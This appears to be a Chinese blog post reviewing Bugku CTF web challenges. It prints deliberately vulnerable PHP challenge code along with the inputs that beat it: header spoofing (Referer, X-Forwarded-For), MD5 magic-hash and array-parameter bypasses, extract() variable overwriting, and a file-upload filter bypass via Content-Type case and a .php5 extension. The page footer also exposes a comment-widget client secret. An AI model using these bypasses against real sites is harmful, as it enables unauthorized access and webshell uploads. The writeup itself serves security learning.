<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">highlight_file(<span class="string">'2.php'</span>);</span></span><br><span class="line"><span class="php">$key=<span class="string">'KEY&#123;********************************&#125;'</span>;</span></span><br><span class="line"><span class="php">$IM= preg_match(<span class="string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="string">"id"</span>]), $match);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $IM )&#123; </span></span><br><span class="line"><span class="php">  <span class="keyword">die</span>(<span class="string">'key is: '</span>.$key);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>从上面代码可以看出，传入满足正则表达式的id即可获得key.</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.匹配除\n之外的任何单个字符</span><br><span class="line">*匹配它前面的表达式<span class="number">0</span>次或多次等价于&#123;<span class="number">0</span>,&#125;</span><br><span class="line">&#123;<span class="number">4</span>.<span class="number">7</span>&#125;代表最少匹配<span class="number">4</span>次且最多匹配<span class="number">7</span>次结合前面的.就是匹配<span class="number">4</span>到<span class="number">7</span>个任意字符</span><br><span class="line">\/就是/反斜杠用来转义斜杠</span><br><span class="line"><span class="string">[a-z]</span>匹配小写字母</span><br><span class="line"><span class="string">[:punct:]</span>匹配任何标点符号</span><br><span class="line">/i不区分大小写</span><br></pre></td></tr></table></figure>

<p>于是直接构造?id=keykey1111key:/a/keya.拿到flag</p>
<p>25.<a href="http://123.206.87.240:9009/from.php" target="_blank" rel="noopener">你从哪里来</a><br>进入页面看见are you from google?<br>抓包添加Referer: <a href="https://www.google.com即可拿到flag" target="_blank" rel="noopener">https://www.google.com即可拿到flag</a><br>http数据包头部中使用Referer字段告诉服务器我是从哪个页面链接来的，服务器基于此可以获得一些信息用于处理。</p>
<p>26.<a href="http://123.206.87.240:9009/md5.php" target="_blank" rel="noopener">md5 collision(NUPT_CTF</a><br>进入页面没有任何提示，既然md5碰撞，找个md5后是0e的传入?a=s878926199a拿到flag</p>
<p>27.<a href="http://123.206.87.240:8002/localhost/" target="_blank" rel="noopener">程序员本地网站</a><br>进入网站后提示请从本地访问，抓包构造X-Forwarded-For: 127.0.0.1</p>
<p>28.<a href="http://123.206.87.240:8002/web7/" target="_blank" rel="noopener">各种绕过</a><br>又是一道代码审计题如下:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">highlight_file(<span class="string">'flag.php'</span>);</span></span><br><span class="line"><span class="php">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span></span><br><span class="line"><span class="php">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>])</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>))</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'sorry!'</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>打开hackbar,url中构造?id=margin&amp;uname[]=123<br>然后post传入passwd[]=abc拿到flag.</p>
<p>29.<a href="http://123.206.87.240:8002/web8/" target="_blank" rel="noopener">web8</a><br>进入页面后又是代码审计题</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">extract($_GET);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">$f = trim(file_get_contents($fn));</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($ac === $f)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>这道题之前提示了个…txt于是用御剑扫描哈，发现有个flag.txt，然后打开里面内容是flags.<br>根据代码，第一句extract(可控参数)这种写法导致变量覆盖漏洞，因而传入的get参数可以覆盖代码中变量的值，而$f是从fn文件中取得的值，与是构造?fn=flags.txt&amp;ac=flags.这样就满足代码条件拿到flag.</p>
<p>30.<a href="http://123.206.87.240:8002/web13/" target="_blank" rel="noopener">细心</a><br>进入页面后，发现是404，提示想办法成为admin，看一下有没有robots.txt,发现目录下有个php,打开后看到一个IP已经被禁止，抓包用X-F-F构造绕过，然后下面有个代码get[x]=password,猜测password=admin,因而直接传入x=admin拿到FLAG.</p>
<p>31.<a href="http://123.206.87.240:8002/web9/" target="_blank" rel="noopener">求getshell</a><br>进入页面后，是一个上传框，BP抓包，直接上传php提示invalid file,尝试将Content-type中的mUltipart/form-data进行大小写绕过，以及文件名使用其他的，发现php5成功上传，拿到flag.</p>
<p>&emsp;&emsp;summary:这里之所以修改Content-type是因为服务器后端会进行两次检测，然而检测Content-type时只支持小写字符，因而大小写可以绕过这个检测，之后猜测到其可能是黑名单过滤机制，找到php5正确拿到flag.<br>32.<a href="http://123.206.87.240:8002/flagphp/" target="_blank" rel="noopener">flag.php</a><br>进入页面后，发现登录框根本点不动，检查是否是前段按钮的问题发现post是#也就是提交给本页面，因而登录框极有可能个幌子，题目最开始提示了一个hint,但是我们去数据包头部，以及响应包头部中都未发现有hint,因而猜测hint可能是一个变量，尝试在url中传入?hint，发现源代码:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span></span><br><span class="line"><span class="php">$cookie = $_COOKIE[<span class="string">'ISecer'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hint'</span>]))&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">"$KEY"</span>)</span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$KEY=<span class="string">'ISecer:www.isecer.com'</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>一开始我想要把下面的php中的key序列化后传入，但发现思路错误，在本地，同样这样写入代码，会发现第一个php中key的值因该为””，这里涉及到一个变量的作用域问题，可以知道这两个php中的$key只在自己的php脚本中有效果，要想跨脚本变量有效，可以定义session或者cookie传值。</p>
<p>33.PHP_encrypt_1(ISCCCTF)<br>这道题让下载一个zip,记忆中是写出对应的解密算法，我们打开看下。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $key = md5(<span class="string">'ISCC'</span>);</span></span><br><span class="line"><span class="php">    $x = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">    $len = strlen($data);</span></span><br><span class="line"><span class="php">    $klen = strlen($key);</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($x == $klen)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $x = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $char .= $key[$x];</span></span><br><span class="line"><span class="php">        $x+=<span class="number">1</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span></span><br><span class="line"><span class="php">        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="number">128</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> base64_encode($str);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>其中ord是取首个字母的ASCII值，而chr是将ASCII值变为字母，阅读代码意思是将加密的字符串的每个字母让其ASCII值与加密的key的每个字符串的ASCII值相加再余128得到的ASCII值化为字母最后组合起来即得到$str,最后再经过base64加密，因而我写出来的解密脚本如下所示:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>代码审计部分<br>extract变量覆盖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$flag=<span class="string">'xxx'</span>;</span></span><br><span class="line"><span class="php">extract($_GET);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">$content=trim(file_get_contents($flag));</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($shiyan==$content)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span><span class="string">'flag&#123;xxx&#125;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>这里把get传入的值直接导入变量表，由于没有设置第二个选项，如果变量重复会直接覆盖，因而传入?flag=&amp;shiyan=即可拿下flag.这里说一下很多人都说使得两个值相同即可，这里有个坑这个flag因该是一个文件名，从file_get_content这个函数看出，如果不存在的文件名导入内容才能覆盖，这里直接不传flag值也可以拿下flag.说明这个文件本来就不存在。</p>
<p><a href="http://123.206.87.240:9009/6.php" target="_blank" rel="noopener">strcmp比较字符串</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag&#123;xxxxx&#125;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (strcmp($_GET[<span class="string">'a'</span>], $flag) == <span class="number">0</span>) <span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span></span></span><br><span class="line"><span class="php"><span class="comment">//比较两个字符串（区分大小写）</span></span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php"><span class="keyword">print</span> <span class="string">'No'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>由于strcmp函数的漏洞，它无法比较数组类型，因而直接传入?a[]=1即可得到flag.<br>这里是php5.3之前的漏洞，当传入该函数未预料到的类型，它期望传入字符串类型的数据，一旦传入其不期望的类型，这里传入了数组它将返回0也即判断相等。在5.3之后修复了这个漏洞，这里我们本地传入数组会直接报错不会有任何返回值:Warning: strcmp() expects parameter 1 to be string, array given in D:\phpStudy\WWW\dmsj\study.php on line 36</p>

  </article>
  
    
<div class="nexmoe-post-copyright">
<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
<strong>Author：</strong>Cupid<br>
<strong>Link：</strong><a href="http://yoursite.com/2020/01/19/review-bugku/" title="http://yoursite.com/2020/01/19/review-bugku/" target="_blank" rel="noopener">http://yoursite.com/2020/01/19/review-bugku/</a><br>

  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可

</div>


  
  <section class="nexmoe-comment">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
<div id="gitalk"></div>
<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
<script type="text/javascript">
    var gitalk = new Gitalk({
        clientID: '80b2453b6d5f37ad6225',
        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
        id: window.location.pathname,
        repo: 'nexmoe.github.io',
        owner: 'nexmoe',
        admin: 'nexmoe'
    })
    gitalk.render('gitalk')
</script>
</section>
</div>
    </div>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>


 
    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>


<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>

<script src="/js/app.js?v=1582646440476"></script>
<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>


    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>



  





</body>

</html>
